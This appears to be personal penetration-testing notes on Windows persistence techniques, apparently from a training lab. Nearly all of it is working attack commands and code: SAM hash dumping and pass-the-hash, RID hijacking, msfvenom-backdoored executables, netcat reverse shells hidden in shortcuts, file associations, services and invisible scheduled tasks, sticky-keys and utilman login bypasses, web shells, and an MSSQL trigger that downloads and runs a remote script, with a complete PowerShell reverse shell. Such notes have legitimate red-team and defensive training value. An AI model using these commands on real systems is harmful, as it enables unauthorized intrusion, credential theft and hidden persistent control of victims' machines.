# Unprivileged Accounts
Having an administrator's credential would be the easiest way to achieve persistence in a machine. However, it would be more likely to raise any flags, so we can manipulate unprivileged users, which normally won't be monitores as much as administrators and grant them administrative privileges. For this we will need to already have achieved an administrative account.
## Assign Group Memberships
For this, we need to have the password of the unprivileged account. The direct way to make an unprivileged user gain administrative privileges is to make it part of the `Administrators` group. We can easily do this
```powershell
net localgroup administrators unprivUser /add
```

If this looks too suspicious, we can use the `Backup Operators` group. 
```powershell
net localgroup "Backup Operators" unprivUser /add
```
Users in this group won't have administrative privileges but will be **allowed to read/write any file or registry key** on the system, ignoring any configured DACL. This would allow us to **copy the content of the SAM and SYSTEM registry hives**, which we can use to recover the password hashes for all the users, thus enabling us to escalate to any administrative account trivially.
Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the `Remote Desktop Users` (RDP) or `Remote Management Users` (WinRM) groups
```powershell
net localgroup "Remote Management Users" unprivUser /add
```
Now, the User Account Control (UAC), implements a feature called `LocalAccountTokenFilterPolicy`, which strips any local account of its administrative privileges when logging in remotely. While we can elevate it through a GUI, we need to disable it if we are to use WinRM by changing the registry key to `1`
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```
Once this has been setup, we can use our backdoor by establishing a connection through [[Evil-WinRM]] 
```bash
evil-winrm -i IP -u unprivUser -p Password123
```
We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine.
```WinRM
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```
With those files we can dump the password hashes for all users using `secretsdump.py` or other similar tools
```bash
python3 secretsdump.py -sam sam.bak -system system.bak LOCAL
```
And finally perform a Pass-the-Hash to connect to the target machine with administrator privileges
```bash
evil-winrm -i IP -u Administrator -h 1cea1d...daa3
```

## Special Privileges and Security Descriptors
A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. In the case of the Backup Operators group, it has the following two privileges assigned by default:
- SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
- SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
We can assign such privileges to any user, independent of their group memberships. To do this we can use the `secedit` command. First, we will export the current configuration to a temporary file
```powershell
secedit /export /cfg config.inf
```
We then open the file and add our unprivileged user to the lines in the configuration regarding the `SeBackupPrivilege` and `SeRestorePrivilege`, leaving it like so
```notepad
...
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,UnprivUser
...
...
...
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,UnprivUser
...
```
We finally convert the `.inf` file into a `.sdb` which is then used to load the configuration back into the system
```powershell
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```
We should now have a user with equivalent privileges to any Backup Operator. Although the user still can't log into the system via WinRM. Instead of adding the user to a group, we can change the security descriptor associated with the WinRM service to allow thmuser2 to connect. To open the configuration window for WinRM's security descriptor, we can use the following
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
This will open a GUI where we can add our `UnprivUser` and assign it full privileges to connect to WinRM. Before connecting through [[Evil-WinRM]] we need to make sure to disable `LocalAccountTokenFilterPolicy`
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```
And from here we can proceed to connect through WinRM, and create a backup of SAM and SYSTEM and perform a Pass the hash attack, like if we would've added our user to a group.

## RID Hijacking
Another method to gain administrative privileges is changing some registry values to make the operating system think we are the Administrator.
When a user is created, and identifier called **Relative ID** (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry from the SAM registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
In any Windows system, the default Administrator account is assigned the `RID = 500`, and regular users usually have `RID >= 1000`. To find the assigned RIDs for any user we can use the following command
```powershell
wmic useraccount get name,sid
```
The RID is the last bit of the SID. The SID is an identifier that allows the OS to identify a user across a domain. Now we only have to assign the `RID=500` to our `unprivUser`. To do this, we need to access the SAM using [[Regedit]]. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as System, we will use [[psexec]].
```powershell
PsExec64.exe -i -s regedit
```
This will open the GUI of Regedit as System, from here we will go to 
```Regedit
HKLM\SAM\SAM\Domains\Account\Users\
```
Where there will be a key for each user in the machine. Since we want to modify a specific user, we need to search for a key with its RID in Hex (ex. 1010 = 0x3F2). Under the corresponding key, there will be a value called `F`, which holds the user effective RID at position `0x30`. Notice the RID is stored using little-endian notation, so its bytes appear reversed (`F203` in our example). We can then replace those two bytes with the RID of Administrator in Hex (500 = 0x01F4) switching the bytes `F401`. 
Now the next time we login as our `umprivUser` the LSASS will associate it with the same RID as Administrator and grant us the same privileges. 
Now we can enter the user via RDP ([[Remmina]],[[xfreerdp]], etc.)
```bash
xfreerdp /u:unprivUser /p:Password321 /v:IP
```

# Backdooring Files
Through the tampering of some files we know the user interacts regularly, we can gain some form of persistence. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user access them. Since we don't to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.
## Executable Files
If we find any executables laying around the desktop, the chances are high that the user might use it frequently. Supposing we find a shortcut to PuTTY lying around, if we checked the shortcut's properties, we could see that it (usually) leads to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.
We can easily plant a payload of our preference in any `.exe` file with [[Metasploit#Msfvenom|msfvenom]]. The binary will still work as usual but execute an additional payload silently by adding an extra thread in our binary. To create a backdoored `.exe`, we can use the following
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/meterpreter/reverse_tcp lhost=eth0 lport=4444 -b "\x00" -f exe -o puttyX.exe 
```

## Shortcut Files
If we don't want to alter the executable, we can tamper with the shortcut fiel itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally. For this we can access the properties of a shortcut and modify the `Target` space to point it to a script that will run a backdoor and then execute the usual program normally.
We can create a simple Powershell script in any sneaky location that we like
```powershell
Start-Process -NoNewWindow "c:\Users\user\Desktop\nc64.exe" "-e cmd.exe IP 4444" 

C:\Windows\System32\calc.exe
```
Now we can change the shortcut's target to point to our script, by doing so, the shortcut's icon will be automatically adjusted, so we will need to change it back to the original exe so we don't out ourselves. We'll also want to run our scrip on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. Making our final target shortcut
```Target
powershell.exe -WindowsStyle hidden C:\Windows\System32\NotABackdoor.ps1
```


---

Note that this will briefly flash the console, as powershell has to first load the CLI to then hide the window through the `-windowstyle hidden`. To circumvent this, we can use `wscript` instead, as this can run code without displaying the window by setting the window visibility to 0
```vbscript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("""C:\tools\nc64.exe""" & "-e cmd.exe IP 4444"),0,False 
shell.Run("C:\Windows\System32\calc.exe"),1,True 
```
And changing the shortcut target to
```target
wscript.exe /e:VBScript C:\Windows\System32\back.vbs
```
We can also save the backdoor as any other extension (ex `.txt`) and still open it by using `wscript` 

## Hijacking File Associations
The default OS file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. If for example we want to check which program is used to open `.txt` files, we can just go and check in the Regedit for the `.txt` subkey and find which Programmatic ID (ProgID) is associated with it. A ProgID is simply an identifier to a program installed on the system. For `.txt` files the ProgID is `txtfile`.
We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling `.txt` files. Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified.
Normally, when we try to open a `.txt` file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1` where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual.  
```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe IP 4444"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```
or 
```vbscript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("""C:\tools\nc64.exe""" & "-e cmd.exe IP 4444"),0,False 
shell.Run("""C:\Windows\System32\notepad.exe""" & WScript.Arguments(0)),1,True 
```
And finally changing the registry key data to run our backdoor script. For powershell
```Data
powershell -windowstyle hidden C://windows//system32//backdoor.ps1 %1
```
For vbs
```Data
C:\Windows\System32\wscript.exe /e:VBScript C:\Windows\System32\backdoor.txt %1
```

# Services
Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the target machine is started. If we can leverage any services to run something for us, we can regain control of the victim machine each time is started.
A service being an executable that runs in the background. When configuring a service, we define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.
## Creating Backdoor Services
We can create and start a service using the following commands (There must be a space after each equal sign)
```Powershell
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```
The `net user` command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (`start= auto`), so that it runs without requiring user interaction.

---

Resetting a user's password works well enough, but we can also create a reverse shell with [[Metasploit#Msfvenom|msfvenom]] and associate it with the created service. Notice, however, that services executables are unique since they need to implement a particular protocol to be handled by the system. If we want to create an executable that is compatible with Windows services, we can use the `exe-service` format in msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=IP lport=4444 -f exe-service -o rev-svc.exe
```
We can then copy the executable and point the service's binPath to it
```powershell
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```
When the service is started we should get back a connection.

## Modifying existing services
While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.
We can get a list of available services using the following command
```powershell
sc.exe query state=all
```
From here we can start checking for stopped services, we then can query the service's configuration, to find more about the,
```powershell
sc.exe qc ServiceName
```
There are three things we care about when using a service for persistence
- The executable (`BINARy_PATH_NAME`) should point to our payload
- The service `START_TYPE` should be automatic so that the payload runs without the user interaction.
- The `SSERVICE_START_NAME`, which is the account under which the service will run, should preferably be set to `LocalSystem` to gain SYSTEM privileges.
We can again create a reverse shell with msfvenom just like above.
Then we need to reconfigure our old service parameters, we can use the following 
```powershell
sc.exe config OldService binPath= "C:\windows\rev-svc.exe" start= auto obj= "LocalSystem"
```
We could of course try to also make a service in the original location if we think that by changing it we might attract attention. Finally we can start the service and we should receive a connection. 

# Scheduled Tasks
We can also scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems.
## Task Scheduler
The most common way to schedule tasks is using the built-in **Windows task scheduler**. The task scheduler allows for granular control of when our task will start, allowing us to configure tasks that will activate at specif hours, repeat periodically or even trigger when specific system events occur. From the command line, we can use `schtasks` to interact with the task scheduler.
Let's create a task that runs a reverse every single minute. In a real-world scenario, we wouldn't want our payload to run so often, but as an example we will.
```powershell
schtasks /create /sc minute /mo 1 /tn TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe IP 4444" /ru SYSTEM
```
This command will create a "TaskBackdoor" task and execute an [[Netcat]] reverse shell back to us. The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates that the task will run with SYSTEM privileges.
We can check if our task was successfully created by using
```powershell
schtasks /query /tn TaskBackdoor
```

## Making Our Task Invisible
Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor** (SD). The SD is simply an ACL that states which users have access to the scheduled task. If our user isn't allowed to query a scheduled task, we won't be able to see it anymore, as Windows only shows us the tasks that we have permission to use. Deleting the SD is equivalent to disallowing all user's access to the scheduled task, including Administrators.
To hide our task, let's delete the SD value for it, to do this we need to use [[psexec]] to open Regedit with SYSTEM privileges
```powershell
PsExec64.exe -s -i regedit
```
By navigating to
```Regedit
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree
```
We will find a tree with the tasks, from here we can select our task and delete the `SD`
If we now try to query our service again, the system will tell us there is no such task

# Logon Triggered Persistance
Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.
## Startup Folder
Each user has a folder under `c:\Users\username\AppData\Roaming\Microsoft\Start Menu\Programs\Startup` where we can put executables to be run whenever the user logs in. An attacker can achieve persistence jut by dropping a payload in there. Notice that each user will only run whatever is available in their folder.
If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.
For this we can generate a reverse shell payload as an `exe` with [[Metasploit#Msfvenom|msfvenom]]. And pass it to the target machine. We then store the payload into the `StartUp` (above) folder to get a shell back for any user logging into the machine. The payload doesn't need a specific name to execute.

## Run / RunOnce
We can also force a user to execute a program on logon via Regedit. Instead of delivering our payload into a specific directory, we can use the following registry entries to specify applications to run at logon
```Regedit
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. While those under the `RunOnce` will only be executed a single time.
Once we have transferred a payload, we just need to create a `REG_EXPAND_SZ` registry (Expandable String Value) under the directory that we want. The entry name can be anything we like, and the value the command that we want to execute (our payload).
After this, when a user logs on, it will spawn a shell, and this will work as many times and users as we created it.

## Winlogon
Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads our user profile right after authentication.
Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence.
- `Userinit` points to `userinit.exe`,which is in charge of restoring our user profile preferences.
- `shell` points to the system's shell, which is usually `explorer.exe`
If we replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, we can append commands separated by a comma, and Winlogon will process them all. So with a simple
```data
c:\windows\system32\userinit.exe, c:\windows\backdoor.exe
```
We are golden. After a user logs in we will receive a shell.

## Logon scripts
One of the things `userinit.exe` does while loading our user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.
Now, each user has its own environment variables, therefore, we will need to backdoor each separately.
To create an environment variable for a user, we can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it get's loaded when the user logs in. It has to be a `REG_EXPAND_SZ` type registry

# Backdooring the Login Screen / RDP
If we have physical access to the machine (or RDP), we can backdoor the login screen to access a terminal without having valid credentials for a machine.
## Sticky Keys
We can configure Windows to use sticky keys, which allows us to press the buttons of a combination sequentially instead of at the same time. To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. 
In doing this, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload, we can then trigger it with the shortcut. Interestingly, ***we can even do this from the login screen, before inputting any credentials.***
A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`
We can do so with
```powershell
takeown /f c:\windows\System32\sethc.exe
icacls c:\Windows\System32\sethc.exe /grant UserName:F
copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
```
Now, we should be able to press `SHIFT` five times to gain access to a terminal with SYSTEM privileges, directly from the login screen.
## Utilman
Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. 
When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again. 
Similar to the process above
```powershell
takeown /f c:\windows\System32\utilman.exe
icacls c:\Windows\System32\utilman.exe /grant UserName:F
copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
```
Now when we face the login interface, we just need to click the "Ease of Access" button for a cmd to appear with SYSTEM privileges

# Persisting Through Existing Services
If we don't want to use windows features to hide a backdoor, we can always profit from any existing service that can be used to run code for us. This will be a how to plant backdoors in a typical web server setup. Still, any other application where we have some degree of control on what gets executed should be backdoorable.
## Using Web Shells
The usual way of achieving persistence in a web server is by uploading a [[Shells#WebShells|web shell]] to the web directory. This is quite trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege` providing an easy way to the Administrator using known [[Privilege Escalation - Windows#SeImpersonate / SeAssignPrimaryToken|exploits]]. 
We can start by downloading an ASP.NET web shell, like [this one](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), or other one. Transfer it to the target machine and move it into the webroot, which is by default is `c:\inetpub\wwwroot` directory.
```console
move shell.aspx c:\inetpub\wwwroot\
```
Depending on the way we create/transfer `shell.aspx`, the permission in the file may not allow the web server to access it. If we are getting a **Permission Denied** error while accessing the shell's URL, we just need to grant everyone full permissions on the file to get it working. We can do so with
```console
icacls shell.aspx /grant Everyone:F
```
We can then run commands from the web server by pointing to the following URL
```URL
http://server.com/shell.aspx
```
While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Thus any change to a file in there will probably trigger an alert.

## Using MSSQL as a Backdoor
There are several ways to plant backdoors in MSSQL server installations. One of those abuses triggers, which in MSSQL allow us to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this, we will create a trigger for any INSERT into an Heterogeneous Replicated DB (HRDB).
Before creating a trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows us to run commands directly in the system's console but comes disabled by default.
To enable it, let's open `Microsft SQL Server Management Studio 18`. Once in, we need to create a new Query. In there we run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration and proceed to enable `xp_cmdshell`.
```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```
After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role will be able to do so. Since it is expected that web applications use a restricted database user, we can gran privileges to all users to impersonate the `sa` user, which is the default database administrator.
```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```
After all of this, we finally configure a trigger. We start by changing to the HRDB database
```sql
USE HRDB
```
Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` DB.
```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://IP:8000/evilscript.ps1'')"';
```
Now that the backdoor is set up, let's create the `evilscript.ps1` that the trigger is going to download and execute, just like a stager, which in this case will contain a powershell reverse shell.
```powershell
$client = New-Object System.Net.Sockets.TCPClient("IP",4444);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```
Now, we will need to open two terminals, one that hosts the `evilscript.ps1` and the listener for the reverse shell.

# RESOURCES
- [Hexacorn - Windows Persistence](https://www.hexacorn.com/blog/category/autostart-persistence/)
- [PayloadsAllTheThings - Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
- [Oddvar Moe - Windows Persistence Through RunOnceEx](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)
- [PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/)